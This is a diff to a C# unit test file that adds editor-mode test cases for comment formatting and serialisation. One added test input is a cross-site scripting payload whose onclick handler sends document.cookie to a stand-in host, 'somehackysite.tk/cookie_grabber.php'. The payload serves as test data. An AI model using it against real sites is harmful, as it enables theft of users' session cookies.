@@ -5,6 +5,8 @@ using System.Xml;
 using BBC.Dna.Utils;
 using Microsoft.VisualStudio.TestTools.UnitTesting;
 using BBC.Dna.Moderation.Utils;
+using System.Text;
+using System.IO;
 
 namespace BBC.Dna.Api.Tests
 {
@@ -17,6 +19,7 @@ namespace BBC.Dna.Api.Tests
     {
         private List<string[]> testDataPlainText;
         private List<string[]> testDataRichText;
+        private List<string[]> testDataRichTextEditor;
         private List<string[]> testDataOther;
         public CommentInfoTest()
         {
@@ -44,6 +47,15 @@ http://www.statistics.gov.uk/pdfdir/lmsuk1110.pdf", "123<BR /><BR /><a href=\"ht
             testDataOther.Add(new[] { "<b>test</b>", "<b>test</b>" });
             testDataOther.Add(new[] { "test\r\nnewline", "test\r\nnewline" });
             testDataOther.Add(new[] { "<script>test</script>", "<script>test</script>" });
+
+            testDataRichTextEditor = new List<string[]>();
+            testDataRichTextEditor.Add(new[] { "test", "test" });
+            testDataRichTextEditor.Add(new[] { "<b>test</b>", "<b>test</b>" });
+            testDataRichTextEditor.Add(new[] { "test\r\nnewline", "test<BR />newline" });
+            testDataRichTextEditor.Add(new[] { "<script>test</script>", "<script>test</script>" });
+            testDataRichTextEditor.Add(new[] { "<a href=\"http://www.bbc.co.uk/testurl\">test</a>", "<a href=\"http://www.bbc.co.uk/testurl\">test</a>" });
+            testDataRichTextEditor.Add(new[] { "this is a <p onclick=\"window.location='http://www.somehackysite.tk/cookie_grabber.php?c=' + document.cookie\">test</p> for bad html tags.", "this is a <p onclick=\"window.location='http://www.somehackysite.tk/cookie_grabber.php?c=' + document.cookie\">test</p> for bad html tags." });
+            
         }
 
         /// <summary>
@@ -55,7 +67,7 @@ http://www.statistics.gov.uk/pdfdir/lmsuk1110.pdf", "123<BR /><BR /><a href=\"ht
 
             foreach (var data in testDataPlainText)
             {
-                TestTextXmlSerialisation(PostStyle.Style.plaintext, data[1], data[0]);
+                TestTextXmlSerialisation(PostStyle.Style.plaintext, data[1], data[0], false);
             }
             
         }
@@ -70,7 +82,20 @@ http://www.statistics.gov.uk/pdfdir/lmsuk1110.pdf", "123<BR /><BR /><a href=\"ht
 
             foreach (var data in testDataRichText)
             {
-                TestTextXmlSerialisation(PostStyle.Style.richtext, data[1], data[0]);
+                TestTextXmlSerialisation(PostStyle.Style.richtext, data[1], data[0], false);
+            }
+
+        }
+
+        /// <summary>
+        ///A test for CommentInfo Constructor
+        ///</summary>
+        [TestMethod]
+        public void CommentInfo_XmlSerialisingRichTextAsEditor_ReturnsValidObject()
+        {
+            foreach (var data in testDataRichTextEditor)
+            {
+                TestTextXmlSerialisation(PostStyle.Style.richtext, data[1], data[0], true);
             }
 
         }
@@ -83,8 +108,8 @@ http://www.statistics.gov.uk/pdfdir/lmsuk1110.pdf", "123<BR /><BR /><a href=\"ht
         {
             foreach (var data in testDataOther)
             {
-                TestTextXmlSerialisation(PostStyle.Style.rawtext, data[1], data[0]);
-                TestTextXmlSerialisation(PostStyle.Style.unknown, data[1], data[0]);
+                TestTextXmlSerialisation(PostStyle.Style.rawtext, data[1], data[0], false);
+                TestTextXmlSerialisation(PostStyle.Style.unknown, data[1], data[0], false);
             }
 
         }
@@ -97,7 +122,7 @@ http://www.statistics.gov.uk/pdfdir/lmsuk1110.pdf", "123<BR /><BR /><a href=\"ht
         {
             foreach (var data in testDataPlainText)
             {
-                TestTextJsonSerialisation(PostStyle.Style.plaintext, data[1], data[0]);
+                TestTextJsonSerialisation(PostStyle.Style.plaintext, data[1], data[0], false);
             }
 
         }
@@ -110,7 +135,7 @@ http://www.statistics.gov.uk/pdfdir/lmsuk1110.pdf", "123<BR /><BR /><a href=\"ht
         {
             foreach (var data in testDataRichText)
             {
-                TestTextJsonSerialisation(PostStyle.Style.richtext, data[1], data[0]);
+                TestTextJsonSerialisation(PostStyle.Style.richtext, data[1], data[0], false);
             }
 
         }
@@ -123,50 +148,51 @@ http://www.statistics.gov.uk/pdfdir/lmsuk1110.pdf", "123<BR /><BR /><a href=\"ht
         {
             foreach (var data in testDataOther)
             {
-                TestTextJsonSerialisation(PostStyle.Style.unknown, data[1], data[0]);
-                TestTextJsonSerialisation(PostStyle.Style.rawtext, data[1], data[0]);
+                TestTextJsonSerialisation(PostStyle.Style.unknown, data[1], data[0], false);
+                TestTextJsonSerialisation(PostStyle.Style.rawtext, data[1], data[0], false);
             }
 
         }
 
-        private void TestTextXmlSerialisation(PostStyle.Style style, string expected, string input)
+        private void TestTextXmlSerialisation(PostStyle.Style style, string expected, string input, bool isEditor)
         {
             var target = new CommentInfo
             {
                 PostStyle = style,
-                text = CommentInfo.FormatComment(input, style, CommentStatus.Hidden.NotHidden)
+                text = CommentInfo.FormatComment(input, style, CommentStatus.Hidden.NotHidden, isEditor)
             };
-            expected = StringUtils.SerializeToXml(expected);
             var docExpected = new XmlDocument();
-            docExpected.LoadXml(expected);
+            docExpected.Load(StringUtils.SerializeToXml(expected));
             expected = docExpected.DocumentElement.InnerXml;
 
             var doc = new XmlDocument();
-            doc.LoadXml(target.ToXml());
+            doc.Load(target.ToXml());
             Assert.AreEqual(expected, doc.DocumentElement["text"].InnerXml);
         }
 
-        private void TestTextJsonSerialisation(PostStyle.Style style, string expected, string input)
+        private void TestTextJsonSerialisation(PostStyle.Style style, string expected, string input, bool isEditor)
         {
             var target = new CommentInfo()
             {
                 PostStyle = style,
-                text = CommentInfo.FormatComment(input, style, CommentStatus.Hidden.NotHidden)
+                text = CommentInfo.FormatComment(input, style, CommentStatus.Hidden.NotHidden, isEditor)
             };
-            var doc = target.ToJson();
 
-            expected = StringUtils.SerializeToJson(expected);
-            expected = expected.Substring(1, expected.Length - 2);//strips quotes from around text
+            MemoryStream stream = (MemoryStream)StringUtils.SerializeToJson(target);
+            var doc = Encoding.UTF8.GetString(stream.ToArray());
 
-           
-            var regText = new Regex("\"text\"\\:\"(.*)\",");
-            Assert.IsTrue(regText.IsMatch(doc));
-            MatchCollection matches = regText.Matches(doc);
-            foreach (Match match in matches)
-            {
-                var actual = match.Value.Substring(8, match.Value.Length - 10);
-                Assert.AreEqual(expected, actual);
-            }
+            var returnedObject = (CommentInfo)StringUtils.DeserializeJSONObject(doc, target.GetType());
+            Assert.AreEqual(expected, returnedObject.text);
+            //var regText = new Regex("\"text\"\\:\"(.*)\",");
+            //Assert.IsTrue(regText.IsMatch(doc));
+            //MatchCollection matches = regText.Matches(doc);
+            //foreach (Match match in matches)
+            //{
+            //    var actual = match.Value.Substring(8, match.Value.Length - 10);
+            //    actual = actual.Replace("\\/", "/");
+            //    actual = actual.Replace("/\\", "/");
+            //    Assert.AreEqual(expected, actual);
+            //}
             
         }
     }
